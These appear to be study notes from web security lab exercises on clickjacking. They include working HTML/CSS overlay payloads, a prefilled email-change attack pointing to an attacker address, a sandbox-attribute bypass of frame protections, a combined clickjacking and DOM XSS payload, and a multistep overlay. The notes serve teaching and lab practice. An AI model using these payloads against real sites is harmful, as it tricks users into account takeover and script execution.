# Clickjacking (UI redressing)
Appears when we create some additional content (invisible iframe) on existing website and force user to click it.  
We use decoy website on which content is displayed and invisible evil site inside of iframe which is placed over original content.  
Clickjacking attacks are using CSS to place target content over decoy website like this:
```
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```
To generate HTML files automatically, we can use Clickbandit burp tool.  
Also we can pre-generate some field values (for example e-mail for update email function) in order to make victim send needed to us paylaod:
```
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```
## Bypassing protections
Main way of protecting against clickjacking attacks is browser extensions or framework configurations, which make frames visible or control website to be always top-alligned. One of ways to bypass it is to use `sandbox` attribute with `allow-forms` or `allow-scripts` values.
```
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```
## Combining clickjacking with DOM XSS
In such case we can add xss into iframe and force user to execute xss  
```
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
</style>
<div>Test me</div>
<iframe
src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```
## Multistep clickjacking
In such case we can use couple of divisions and iframes in order to force victim to perform multiple actions  
Example:
```
<style>
    #first_iframe {
        position:relative;
        width:1000px;
        height: 1000px;
        opacity: 0.5;
        z-index: 2;
    }
    #first_div {
        position:absolute;
        top:510px;
        left:80px;
        z-index: 1;
    }
    #second_div {
        position:absolute;
        top:300px;
        left:210px;
        z-index: 1;
    }
</style>
<div id="first_div">Click me first</div>
<div id="second_div">Click me next</div>
<iframe id="first_iframe" src="https://0af000a4043a20148070587b009600af.web-security-academy.net/my-account"></iframe>
```